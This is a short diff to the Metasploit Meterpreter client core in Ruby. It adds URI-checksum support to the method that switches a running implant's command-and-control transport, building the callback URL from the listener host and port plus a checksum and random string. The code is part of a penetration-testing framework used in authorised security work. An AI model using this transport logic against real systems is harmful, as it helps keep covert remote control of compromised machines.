@@ -11,6 +11,12 @@ require 'msf/core/payload/windows'
 # Provides methods to patch options into the metsrv stager.
 require 'rex/payloads/meterpreter/patch'
 
+# URI checksum calculation
+require 'rex/payloads/meterpreter/uri_checksum'
+
+# URI checksumming stuff
+require 'msf/core/handler/reverse_https'
+
 module Rex
 module Post
 module Meterpreter
@@ -27,6 +33,8 @@ class ClientCore < Extension
 
   UNIX_PATH_MAX = 108
   DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
+
+  include Rex::Payloads::Meterpreter::UriChecksum
 
   #
   # Initializes the 'core' portion of the meterpreter client commands.
@@ -226,14 +234,17 @@ class ClientCore < Extension
     request = Packet.create_request('core_change_transport')
 
     url = "#{opts[:scheme]}://#{opts[:lhost]}:#{opts[:lport]}"
-    url <<  '/' + opts[:suffix] if opts[:suffix]
+
+    if opts[:adduri]
+      checksum = generate_uri_checksum(URI_CHECKSUM_CONN)
+      rand = Rex::Text.rand_text_alphanumeric(16)
+      url <<  "/#{checksum}_#{rand}/"
+    end
 
     request.add_tlv(TLV_TYPE_TRANSPORT_TYPE, opts[:type])
     request.add_tlv(TLV_TYPE_TRANSPORT_URL, url)
 
     response = client.send_request(request)
-
-    # TODO: shut this baby down.
   end
 
   #
